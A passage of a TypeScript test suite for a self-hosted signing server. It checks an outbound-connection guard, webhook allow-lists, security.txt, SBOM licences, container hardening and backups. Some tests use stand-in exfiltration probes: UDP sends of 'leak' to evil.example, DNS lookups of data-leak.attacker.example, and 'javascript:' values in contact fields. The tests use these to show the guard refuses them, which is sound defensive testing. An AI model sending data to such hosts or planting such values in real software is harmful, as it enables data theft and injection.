    assert.equal(r.data.error, 'Webhooks on this server can only go to hooks.internal, *.corp.example. That is a rule of the people who run it, so ask them if you need another address.');
    // An exact name the operator listed may lead into their own network; a name under a "*." pattern may not.
    (dns.promises as any).lookup = async (h: string) => (h === 'hooks.internal' || h === 'a.corp.example' ? [{ address: '10.0.0.5', family: 4 }] : realPLookup(h));
    assert.equal((await import('node:dns/promises')).default, dns.promises);
    assert.deepEqual((await resolvePublic('https://hooks.internal/in')).addresses, [{ address: '10.0.0.5', family: 4 }]);
    await assert.rejects(resolvePublic('https://a.corp.example/in'), /has to be an https address on the public internet/);
    r = await alice.post('/webhooks', { url: 'https://hooks.internal/in' });
    assert.equal(r.status, 200, JSON.stringify(r.data));
    // A webhook saved before the rule is refused at every delivery, and the log says why.
    const acct = server.db.get("SELECT account_id FROM memberships m JOIN users u ON u.id=m.user_id WHERE u.email='alice@selfhost.example'").account_id;
    server.db.run("INSERT INTO webhooks (id, account_id, url, secret, events, created_at) VALUES ('whk_old', ?, 'https://203.0.113.5/old', 'whsec_x', '*', ?)", acct, new Date().toISOString());
    await deliver(server.db.get("SELECT * FROM webhooks WHERE id='whk_old'"), 'envelope.sent', null, '{}');
    const d = server.db.get("SELECT * FROM webhook_deliveries WHERE webhook_id='whk_old'");
    assert.equal(d.done, 1);
    assert.equal(d.status, null);
    assert.match(d.error, /^Webhooks on this server can only go to hooks\.internal/);
  } finally {
    (dns.promises as any).lookup = realPLookup;
    if (saved.mode === undefined) delete process.env.OUTSIDE_CALLS;
    else process.env.OUTSIDE_CALLS = saved.mode;
    if (saved.hosts === undefined) delete process.env.WEBHOOK_ALLOW_HOSTS;
    else process.env.WEBHOOK_ALLOW_HOSTS = saved.hosts;
  }
  // The Settings page shows no form when none may be added, and the rule when some may.
  const page = read('src/app/app/settings/page.tsx');
  assert.match(page, /hooks\.allowed_hosts\.length === 0\s*\? <p className="muted small"[^>]*>Webhooks are switched off on this server/);
});

test('outside: every place the server calls out is on the list', () => {
  // A file in src/server that opens a connection of its own must be one of these, each tied to a line of the list.
  const KNOWN: Record<string, string[]> = {
    'mail.ts': ['mail'], 'routes-billing.ts': ['payments'], 'oidc.ts': ['google', 'microsoft'], 'sms.ts': ['sms'], 'tsa.ts': ['tsa'],
    'chat.ts': ['chat'], 'convert.ts': ['converter'], 'routes-bounces.ts': ['sns'], 'webhooks.ts': ['webhooks'], 'pwned.ts': ['pwned'],
  };
  const CALLS = /\bfetch\(|createTransport\(|\bhttps?\.request\(|\bnet\.(connect|createConnection)\(|\btls\.connect\(/;
  const dir = path.join(ROOT, 'src/server');
  const found = fs.readdirSync(dir).filter((f) => f.endsWith('.ts') && f !== 'outside.ts')
    .filter((f) => fs.readFileSync(path.join(dir, f), 'utf8').split('\n').some((l) => !/^\s*(\/\/|\*)/.test(l) && CALLS.test(l)));
  const unknown = found.filter((f) => !KNOWN[f]);
  assert.deepEqual(unknown, [], `These files call out and are not on the list in src/lib/outside.ts (add a line there and here): ${unknown.join(', ')}`);
  const ids = new Set(outsideServices(FULL).map((s) => s.id));
  for (const [f, list] of Object.entries(KNOWN)) for (const id of list) assert.ok(ids.has(id as any), `${f}: ${id}`);
  // Nothing in src/lib calls out at all.
  for (const f of fs.readdirSync(path.join(ROOT, 'src/lib')).filter((x) => x.endsWith('.ts'))) assert.ok(!CALLS.test(read(`src/lib/${f}`).replace(/\/\/.*$/gm, '')), f);
  // What is not built is said, and none of it is half there.
  assert.ok(NOT_BUILT.length >= 3);
  // The leaked-password check exists now (src/server/pwned.ts): it is on the list, and no longer said to be missing.
  assert.ok(ids.has('pwned' as any) && !NOT_BUILT.some((x) => /leaked passwords/.test(x)));
});

// ---- 4. The security contact -----------------------------------------------------------------------------------------

test('security.txt: served from SECURITY_CONTACT with the fields RFC 9116 asks for, and absent without one', async () => {
  const now = Date.UTC(2026, 10, 20, 15, 30);
  const text = securityTxt('https://sign.example.gov/', { SECURITY_CONTACT: 'security@example.gov, https://example.gov/report, not an address, javascript:alert(1)' }, now)!;
  const lines = text.trim().split('\n');
  assert.deepEqual(lines.filter((l) => l.startsWith('Contact:')), ['Contact: mailto:security@example.gov', 'Contact: https://example.gov/report']);
  const exp = Date.parse(lines.find((l) => l.startsWith('Expires: '))!.slice(9));
  assert.ok(exp > now + 359 * 864e5 && exp < now + 365 * 864e5, 'less than a year ahead');
  assert.equal(new Date(exp).getUTCHours(), 0);
  assert.ok(lines.includes('Canonical: https://sign.example.gov/.well-known/security.txt'));
  assert.ok(lines.includes('Policy: https://sign.example.gov/security/disclosure'));
  assert.ok(text.endsWith('\n') && !/[—]/.test(text));
  assert.equal(SECURITY_TXT_DAYS, 360);
  // Nothing usable: no file, and the log says why.
  assert.equal(securityTxt('https://x.example', {}), null);
  assert.equal(securityTxt('https://x.example', { SECURITY_CONTACT: 'nobody, http://plain.example' }), null);
  assert.match(securityContactWarning({ SECURITY_CONTACT: 'nobody' })!, /holds no email address and no https address/);
  assert.equal(securityContactWarning({}), null);
  assert.deepEqual(securityContacts({ SECURITY_CONTACT: 'mailto:a@b.example' }), ['mailto:a@b.example']);
  // The reply time: whole days from 1 to 90, or nothing promised.
  assert.equal(replyDays({ SECURITY_REPLY_DAYS: '14' }), 14);
  for (const v of ['0', '91', 'two weeks', '3.5', '']) assert.equal(replyDays({ SECURITY_REPLY_DAYS: v }), null, v);
  assert.match(securityContactWarning({ SECURITY_REPLY_DAYS: 'soon' })!, /must be a whole number of days from 1 to 90/);
  // The route itself.
  delete process.env.SECURITY_CONTACT;
  let res = securityTxtRoute();
  assert.equal(res.status, 404);
  process.env.SECURITY_CONTACT = 'security@selfhost.example';
  try {
    res = securityTxtRoute();
    assert.equal(res.status, 200);
    assert.match(res.headers.get('content-type')!, /^text\/plain/);
    const body = await res.text();
    assert.match(body, /^Contact: mailto:security@selfhost\.example$/m);
    assert.match(body, /^Canonical: http:\/\/test\.local\/\.well-known\/security\.txt$/m);
  } finally {
    delete process.env.SECURITY_CONTACT;
  }
  // The disclosure page promises only what is set.
  const page = read('src/app/security/disclosure/page.tsx');
  assert.match(page, /contacts\.length && days\s*\?/);
  assert.match(page, /have not said how soon they answer a report/);
  assert.match(page, /No reward or payment for a report/);
});

// ---- 5. The software bill of materials -------------------------------------------------------------------------------

test('sbom: npm makes it, it lists pdf-lib, and a licence nobody checked stops it', () => {
  const bom = makeSbom();
  assert.equal(bom.bomFormat, 'CycloneDX');
  const pdf = bom.components.find((c: any) => c.name === 'pdf-lib');
  assert.ok(pdf, 'pdf-lib is in it');
  assert.equal(pdf.licenses[0].license.id, 'MIT');
  assert.ok(!bom.components.some((c: any) => c.name === 'typescript'), 'development packages are not');
  assert.deepEqual(checkLicences(bom).problems, []);
  assert.deepEqual(idsOf('(MIT AND Zlib)'), ['MIT', 'Zlib']);
  const p = checkLicences({ components: [{ name: 'a', version: '1', licenses: [] }, { name: 'b', version: '2', licenses: [{ license: { id: 'SSPL-1.0' } }] }, { name: 'dejavu-fonts-ttf', version: '2', licenses: [] }] }).problems;
  assert.equal(p.length, 2);
  assert.match(p[0], /^a 1 names no licence/);
  assert.match(p[1], /^b 2 is under SSPL-1\.0, which nobody has checked against EUPL-1\.2 yet/);
  // The same lockfile and SOURCE_DATE_EPOCH give the same file.
  const a = makeSbom({ epoch: '1763600000' }), b = makeSbom({ epoch: '1763600000' });
  assert.equal(JSON.stringify(a), JSON.stringify(b));
  // The build runs it.
  assert.match(JSON.parse(read('package.json')).scripts.prebuild, /scripts\/sbom\.mjs/);
});

test('sbom: present at /security/sbom.json after a build', { skip: process.env.SBOM_BUILD_CHECK !== '1' && 'run with SBOM_BUILD_CHECK=1 after npm run build' }, () => {
  const bom = JSON.parse(read('public/security/sbom.json'));
  assert.equal(bom.bomFormat, 'CycloneDX');
  assert.ok(bom.components.some((c: any) => c.name === 'pdf-lib'));
  assert.match(read('public/security/third-party-licences.txt'), /^pdf-lib \S+: MIT$/m);
});

// ---- 6. The documents ------------------------------------------------------------------------------------------------

test('docs: the self-assessment and the runbooks say what they are, claim nothing, and every file they cite exists', () => {
  const controls = read('docs/controls.md');
  const runbooks = read('docs/runbooks.md');
  assert.match(controls, /^# .*\n\n\*\*A self-assessment by the authors\. Not audited, not certified\.\*\*/);
  for (const [name, text] of [['controls', controls], ['runbooks', runbooks]] as const) {
    assert.ok(!/—/.test(text), `${name}: an em dash`);
    // No claim of a scheme: these words appear only as "not ...".
    for (const m of text.matchAll(/\b(compliant|compliance|certified|accredited|aligned with|secure by design)\b/gi)) {
      const before = text.slice(Math.max(0, m.index! - 40), m.index!);
      assert.match(before, /\b(not|never|no|nor|without|Not)\b[^.]*$/, `${name}: "${m[0]}" after "${before}"`);
    }
    for (const m of text.matchAll(/`((?:src|scripts|tests|deploy|docs)\/[\w./[\]-]+?)`/g)) assert.ok(fs.existsSync(path.join(ROOT, m[1].replace(/[),.]+$/, ''))), `${name} cites ${m[1]}, which does not exist`);
  }
  for (const area of ['5 Organizational controls', '6 People controls', '7 Physical controls', '8 Technological controls']) assert.ok(controls.includes(area), area);
  for (let i = 1; i <= 14; i++) assert.match(controls, new RegExp(`^\\| ${i}\\. `, 'm'), `NCSC principle ${i}`);
  for (const h of ['## Restoring a backup', '## Rotating FILE_ENCRYPTION_KEY', '## Rotating APP_SECRET', '## A leaked key', '## A breach']) assert.ok(runbooks.includes(h), h);
});

// ---- 7. The container files, read as text (scripts/container-smoke.sh runs them for real, where Docker is) -----------

test('container: not root, a health check, one volume, one replica, egress denied, and every setting documented', () => {
  const docker = read('Dockerfile');
  assert.match(docker, /^USER node$/m);
  assert.ok(docker.lastIndexOf('USER node') > docker.lastIndexOf('RUN '), 'nothing runs as root after the user is set');
  assert.match(docker, /^HEALTHCHECK [^\n]*\\\n\s+CMD \[.*\/api\/health/m);
  assert.match(docker, /NEXT_TELEMETRY_DISABLED=1/);
  assert.match(docker, /^ARG WITH_LIBREOFFICE=0$/m);
  assert.match(docker, /^RUN npm ci$/m);
  assert.ok(!/npm install/.test(docker.replace(/^#.*$/gm, '')), 'the lockfile decides what is installed');
  assert.match(docker, /^VOLUME \["\/data"\]$/m);
  // No key and no data can get into an image.
  const ignore = read('.dockerignore').split('\n');
  for (const n of ['.env', '.env.*', 'data', 'backups']) assert.ok(ignore.includes(n), n);
  // The compose example: every setting through the env file, the volume, a read-only root, the same health check.
  const compose = read('docker-compose.example.yml');
  assert.match(compose, /env_file:\n\s+- \.env\n/);
  assert.match(compose, /growsigning-data:\/data/);
  assert.match(compose, /read_only: true/);
  assert.match(compose, /cap_drop:\n\s+- ALL/);
  assert.match(compose, /\/api\/health/);
  assert.ok(!/—/.test(docker + compose));
  // The chart: one replica that is not a value, Recreate, the reason said, and egress denied unless listed.
  const dep = read('deploy/helm/growsigning/templates/deployment.yaml');
  assert.match(dep, /^  replicas: 1$/m);
  assert.match(dep, /type: Recreate/);
  assert.match(dep, /readOnlyRootFilesystem: true/);
  assert.match(dep, /runAsNonRoot: true/);
  const values = read('deploy/helm/growsigning/values.yaml');
  assert.ok(!/^replicas?:/m.test(values));
  assert.match(values, /SQLite has one writer/);
  assert.match(values, /^  allowDns: false$/m);
  assert.match(values, /^  egressAllow: \[\]$/m);
  const np = read('deploy/helm/growsigning/templates/networkpolicy.yaml');
  assert.match(np, /policyTypes:\n\s+- Ingress\n\s+- Egress/);
  assert.match(np, /egress: \[\]/);
  // Every setting this feature reads is in .env.example and in the README table, and the health call is described.
  const envExample = read('.env.example'), readme = read('README.md');
  for (const k of ['OUTSIDE_CALLS', 'OUTBOUND_ALLOW', 'WEBHOOK_ALLOW_HOSTS', 'SECURITY_CONTACT', 'SECURITY_REPLY_DAYS']) {
    assert.match(envExample, new RegExp(`^# ${k}=`, 'm'), k);
    assert.match(readme, new RegExp(`^\\| \`${k}\` \\|`, 'm'), k);
  }
  assert.match(readme, /^## Running it yourself$/m);
  assert.match(read('src/server/openapi.ts'), /'\/health': \{ get: \{/);
  // The smoke test really starts the container without a network.
  assert.match(read('scripts/container-smoke.sh'), /docker run -d [^\n]*--network none --read-only/);
});

// ---- After the skeptic's probes (tests/out/verify-ds-self-host/guard-probe.mjs) ---------------------------------------

test('outside: every door a connection can take is held: a bare socket, TLS in an allowed name, http2, UDP and name lookups', async () => {
  const http2 = (await import('node:http2')).default;
  const dgram = (await import('node:dgram')).default;
  const OUT = '198.51.100.9';
  const own = Object.values(os.networkInterfaces()).flat().find((i) => i && i.family === 'IPv4' && !i.internal)?.address;
  // Stand-ins for the resolver, set before the guard so the guard wraps them: they count what reaches the DNS.
  const asked: string[] = [];
  const real = { lookup: dns.lookup, txt: dns.resolveTxt, plookup: dns.promises.lookup, r4: dns.Resolver.prototype.resolve4, pmx: dns.promises.Resolver.prototype.resolveMx, udp: dgram.Socket.prototype.send };
  (dns as any).lookup = (h: string, o: any, cb?: any) => (asked.push(`lookup ${h}`), setImmediate(() => (typeof o === 'function' ? o : cb)(null, '127.0.0.1', 4)));
  (dns as any).resolveTxt = (h: string, cb: any) => (asked.push(`txt ${h}`), setImmediate(() => cb(null, [])));
  (dns.promises as any).lookup = async (h: string) => (asked.push(`plookup ${h}`), { address: '127.0.0.1', family: 4 });
  (dns.Resolver.prototype as any).resolve4 = function (h: string, ...rest: any[]) { asked.push(`r4 ${h}`); setImmediate(() => rest[rest.length - 1](null, [])); };
  (dns.promises.Resolver.prototype as any).resolveMx = async (h: string) => (asked.push(`pmx ${h}`), []);
  let sent = 0;
  dgram.Socket.prototype.send = function (this: any, ...a: any[]) { sent++; const cb = a[a.length - 1]; if (typeof cb === 'function') setImmediate(cb, null, 0); } as any;
  const before = { connect: net.Socket.prototype.connect, send: dgram.Socket.prototype.send, uconnect: dgram.Socket.prototype.connect };
  const local = net.createServer((s) => s.end());
  await new Promise<void>((r) => local.listen(0, '127.0.0.1', r));
  const port = (local.address() as net.AddressInfo).port;
  const undo = installOutsideGuard({ OUTSIDE_CALLS: 'none', OUTBOUND_ALLOW: 'allowed.example' });
  const u = dgram.createSocket('udp4');
  u.on('error', () => {});
  try {
    const p = g.__sgOutsidePolicy;
    // An allowed TLS server name does not make an address allowed.
    assert.ok(!connectAllowed(p, OUT, 'allowed.example'));
    assert.ok(connectAllowed(p, '127.0.0.1', 'allowed.example'));
    assert.ok(connectAllowed(p, 'allowed.example', 'allowed.example'));
    // TCP, by every shape the skeptic got through with.
    await refusedSocket(new net.Socket().connect(port, OUT), /does not connect to 198\.51\.100\.9/);
    await refusedSocket(new net.Socket().connect({ port, host: OUT }), /does not connect to 198\.51\.100\.9/);
    await refusedSocket(tls.connect({ port, host: OUT, servername: 'allowed.example' }), /does not connect to 198\.51\.100\.9/);
    await refusedSocket((tls as any).connect(port, { host: OUT }), /does not connect to 198\.51\.100\.9/);
    await refusedSocket((tls as any).connect(port, OUT, { servername: 'allowed.example' }), /does not connect to 198\.51\.100\.9/);
    await refusedSocket(new tls.TLSSocket(undefined as any).connect({ port, host: OUT }) as any, /does not connect to 198\.51\.100\.9/);
    // http2 says "connect" for a session whose socket already failed (Node does that on purpose), so what counts is
    // the error it gives and, below, that nothing arrived at a server on this machine's own outside address.
    const h2: any = await new Promise((resolve) => http2.connect(`http://${OUT}:${port}`).on('error', resolve));
    assert.equal(h2.code, 'EOUTSIDE');
    if (own) {
      let arrived = 0;
      const outer = net.createServer((s) => (arrived++, s.destroy()));
      await new Promise<void>((r) => outer.listen(0, own, r));
      const op = (outer.address() as net.AddressInfo).port;
      await refusedSocket(new net.Socket().connect(op, own), /does not connect to/);
      await refusedSocket(tls.connect({ port: op, host: own, servername: 'allowed.example' }), /does not connect to/);
      await refusedSocket((tls as any).connect(op, { host: own }), /does not connect to/);
      assert.equal(((await new Promise((resolve) => http2.connect(`http://${own}:${op}`).on('error', resolve))) as any).code, 'EOUTSIDE');
      await new Promise((r) => setTimeout(r, 100));
      outer.close();
      assert.equal(arrived, 0, 'nothing arrived at the server on the outside address');
    }
    // This machine is never outside: a bare socket to it still connects.
    await new Promise<void>((resolve, reject) => { const s = new net.Socket().connect(port, '127.0.0.1'); s.on('connect', () => (s.destroy(), resolve())); s.on('error', reject); });
    // UDP: with a callback, without one (an error event), with offset and length, and connect().
    const e1: any = await new Promise((resolve) => u.send('leak', 53, OUT, resolve));
    assert.equal(e1?.code, 'EOUTSIDE');
    const e2: any = await new Promise((resolve) => u.send(Buffer.from('leak'), 0, 4, 53, OUT, resolve));
    assert.equal(e2?.code, 'EOUTSIDE');
    const u2 = dgram.createSocket('udp4');
    const e3: any = await new Promise((resolve) => { u2.on('error', resolve); u2.send('leak', 53, 'evil.example'); });
    assert.equal(e3?.code, 'EOUTSIDE');
    const e4: any = await new Promise((resolve) => u2.connect(53, OUT, resolve as any));
    assert.equal(e4?.code, 'EOUTSIDE');
    u2.close();
    assert.equal(sent, 0, 'nothing was sent');
    await new Promise((resolve) => u.send('fine', 9, '127.0.0.1', resolve));
    assert.equal(sent, 1, 'this machine itself is not outside');
    // Names that are not allowed are not asked about, in any of the forms; allowed ones and this machine are.
    const cbErr = (f: (cb: any) => void) => new Promise<any>((resolve) => f((e: any) => resolve(e)));
    asked.length = 0; // listening on an address above asked about that address, which goes to no resolver
    assert.equal((await cbErr((cb) => dns.lookup('data-leak.attacker.example', cb)))?.code, 'EOUTSIDE');
    assert.equal((await cbErr((cb) => dns.resolveTxt('data-leak.attacker.example', cb)))?.code, 'EOUTSIDE');
    assert.equal((await cbErr((cb) => new dns.Resolver().resolve4('data-leak.attacker.example', cb)))?.code, 'EOUTSIDE');
    await assert.rejects(dns.promises.lookup('data-leak.attacker.example'), { code: 'EOUTSIDE' });
    await assert.rejects(new dns.promises.Resolver().resolveMx('data-leak.attacker.example'), { code: 'EOUTSIDE' });
    assert.deepEqual(asked, [], 'the resolver was never asked');
    assert.equal(await cbErr((cb) => dns.lookup('allowed.example', cb)), null);
    assert.equal(await cbErr((cb) => dns.lookup('localhost', cb)), null);
    await dns.promises.lookup('allowed.example');
    assert.deepEqual(asked, ['lookup allowed.example', 'lookup localhost', 'plookup allowed.example']);
    // A payment link on such a server: the sender is told why it cannot be checked, not to try again in a minute.
    const { lookHost, hostRefusal } = await import('../src/server/paydns.ts');
    const check = await lookHost('pay.attacker.example');
    assert.deepEqual(check, { ok: false, why: 'later', closed: true });
    assert.match(hostRefusal(check, 'pay.attacker.example'), /set up for a closed network .* OUTBOUND_ALLOW/);
    // Mode listed: connections are held the same, names are still looked up (that is how a payment link is checked).
    installOutsideGuard({ OUTSIDE_CALLS: 'listed' });
    asked.length = 0;
    await refusedSocket(new net.Socket().connect(port, OUT), /OUTSIDE_CALLS=listed/);
    assert.equal(await cbErr((cb) => dns.lookup('pay.example.com', cb)), null);
    assert.deepEqual(asked, ['lookup pay.example.com']);
  } finally {
    g.__sgOutsideUndo?.();
    undo();
    u.close();
    local.close();
    // Taking the guard off puts back exactly what was there.
    assert.equal(net.Socket.prototype.connect, before.connect);
    assert.equal(dgram.Socket.prototype.send, before.send);
    assert.equal(dgram.Socket.prototype.connect, before.uconnect);
    (dns as any).lookup = real.lookup;
    (dns as any).resolveTxt = real.txt;
    (dns.promises as any).lookup = real.plookup;
    dns.Resolver.prototype.resolve4 = real.r4;
    dns.promises.Resolver.prototype.resolveMx = real.pmx;
    dgram.Socket.prototype.send = real.udp;
  }
});

test('security contact: mailto: written twice is one address, and an address with a colon in it is none', () => {
  assert.deepEqual(securityContacts({ SECURITY_CONTACT: 'mailto:mailto:sec@example.org' }), ['mailto:sec@example.org']);
  assert.deepEqual(securityContacts({ SECURITY_CONTACT: 'MAILTO:mailto:Mailto:sec@example.org, sec@example.org' }), ['mailto:sec@example.org']);
  for (const bad of ['mailto:javascript:x@example.org', 'javascript:x@example.org', 'mailto:', 'mailto:mailto:', 'data:a@b.cc', 'mailto:a:b@example.org'])
    assert.deepEqual(securityContacts({ SECURITY_CONTACT: bad }), [], bad);
  assert.doesNotMatch(securityTxt('https://x.example', { SECURITY_CONTACT: 'mailto:mailto:sec@example.org' })!, /mailto:mailto:/);
});

test('backup: only the user who made it can read it, and a folder it may not write to is said with what to do', async () => {
  const { cannotWrite } = await import('../scripts/backup.mjs' as any);
  const dest = path.join(tmp('backups-mode'), 'made-by-the-script');
  const r = await backup({ dataDir: dataDir(), dest });
  const mode = (f: string) => fs.statSync(f).mode & 0o777;
  assert.equal(mode(dest), 0o700, 'the folder it made');
  assert.equal(mode(path.join(r.dir, 'sign.db')), 0o600, 'the database, which is not encrypted');
  assert.equal(mode(path.join(r.dir, MANIFEST)), 0o600);
  for (const n of fs.readdirSync(path.join(r.dir, 'blobs')).slice(0, 3)) assert.equal(mode(path.join(r.dir, 'blobs', n)), 0o600);
  assert.equal(verifyBackup(r.dir).ok, true);
  // What Docker does to ./backups on first use: a folder owned by root, and the backup running as uid 1000.
  const words = cannotWrite(Object.assign(new Error("EACCES: permission denied, mkdir '/backups/x.partial/blobs'"), { code: 'EACCES' }), '/backups').message;
  assert.match(words, /^The folder \/backups cannot be written to by the user this runs as/);
  assert.match(words, /chown 1000:1000 backups\) and run this again\.$/);
  const other = new Error('disk on fire');
  assert.equal(cannotWrite(other, '/backups'), other);
  if (process.getuid?.() !== 0) {
    const locked = tmp('backups-locked');
    fs.chmodSync(locked, 0o500);
    await assert.rejects(backup({ dataDir: dataDir(), dest: locked }), /cannot be written to by the user this runs as/);
    fs.chmodSync(locked, 0o700);
  }
  const compose = read('docker-compose.example.yml');
  assert.match(compose, /mkdir -p backups && sudo chown 1000:1000 backups/);
  assert.match(read('README.md'), /docker compose run --rm backup`, after\s+`mkdir -p backups && sudo chown 1000:1000 backups`/);
});

test('words: nothing on the pages or in the papers says more than the code does', () => {
  // The page on reporting a weakness sends nobody to a help form that no person reads.
  const page = read('src/app/security/disclosure/page.tsx');
  assert.match(page, /const reachable = supportReachable\(\);/);
  assert.match(page, /: reachable\s+\? <>Use the <Link href="\/help\?topic=other#contact">help form<\/Link>[^\n]*It reaches the people who run this server\./);
  assert.match(page, /would reach no person/);
  // /security says what the guard sees, and no flat "connects only".
  const outside = read('src/app/security/Outside.tsx');
  assert.doesNotMatch(outside, /connects only to|checks connections the server opens itself|Every service below|makes no outside calls/);
  assert.match(outside, /not a firewall/);
  // Office files: no network only where unshare works, and it does not in the container as shipped.
  const controls = read('docs/controls.md');
  assert.doesNotMatch(controls, /separate process with no network/);
  assert.match(controls, /no network only where `unshare -rn` works/);
  for (const f of ['Dockerfile', 'docker-compose.example.yml', 'README.md']) assert.match(read(f), /unshare -rn/, f);
  // "Nothing that calls home" outside Docker too: the build and dev scripts switch the framework's statistics off.
  const scripts = JSON.parse(read('package.json')).scripts;
  for (const k of ['build', 'dev']) assert.match(scripts[k], /^NEXT_TELEMETRY_DISABLED=1 next /, k);
  assert.match(read('README.md'), /NEXT_TELEMETRY_DISABLED=1/);
});
